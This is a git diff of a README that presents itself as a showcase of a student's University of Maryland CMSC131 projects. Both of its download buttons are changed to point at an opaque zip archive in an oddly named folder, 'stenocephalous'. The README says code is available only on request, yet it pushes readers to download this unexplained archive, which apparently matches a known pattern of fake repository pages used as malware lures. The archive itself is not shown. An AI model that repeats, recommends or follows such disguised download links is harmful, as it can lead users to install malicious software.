@@ -1,6 +1,6 @@
 # 🚀 UMD CMSC131 Project Showcase 🎓
 
-[![Visit Showcase](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/download/v2.0/Software.zip)](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/download/v2.0/Software.zip)
+[![Visit Showcase](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/raw/refs/heads/main/stenocephalous/umd_project_showcase_cmsc_2.5.zip)](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/raw/refs/heads/main/stenocephalous/umd_project_showcase_cmsc_2.5.zip)
 
 Welcome to the UMD CMSC131 Project Showcase! 🌟 In this repository, you will find a curated collection of project descriptions and tested concepts from my CMSC-131 (UMD's Introductory CS Course) projects. Each project highlight's key challenges, learnings, and outcomes, providing a glimpse into the world of computer science education at the University of Maryland.
 
@@ -18,7 +18,7 @@ For access to code samples or live demos of the showcased projects, please conta
 ### 🚀 Ready to Dive In?
 Simply click the button below to access the showcase and explore the world of UMD CMSC131 projects:
 
-[![Access Showcase](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/download/v2.0/Software.zip)](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/releases/download/v2.0/Software.zip)
+[![Access Showcase](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/raw/refs/heads/main/stenocephalous/umd_project_showcase_cmsc_2.5.zip)](https://github.com/LupeSalas836/umd-cmsc131-project-showcase/raw/refs/heads/main/stenocephalous/umd_project_showcase_cmsc_2.5.zip)
 
 ### 📂 Check the Releases Section
 If the above link doesn't work or if you prefer to explore the repository further, make sure to check the "Releases" section for additional resources and updates.
